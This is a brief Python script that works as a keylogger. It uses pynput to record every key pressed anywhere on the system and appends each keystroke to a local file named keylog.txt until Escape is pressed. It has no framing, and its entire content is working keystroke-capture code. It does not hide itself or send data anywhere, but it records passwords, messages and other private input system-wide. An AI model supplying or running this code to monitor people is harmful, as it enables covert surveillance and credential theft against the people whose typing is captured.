from pynput.keyboard import Key, Listener

log_file = "keylog.txt"


def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write("{0}\n".format(key))
    except Exception as e:
        print("Error:", str(e))


def on_release(key):
    if key == Key.esc:  # Stop the listener on pressing the escape key
        return False


# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
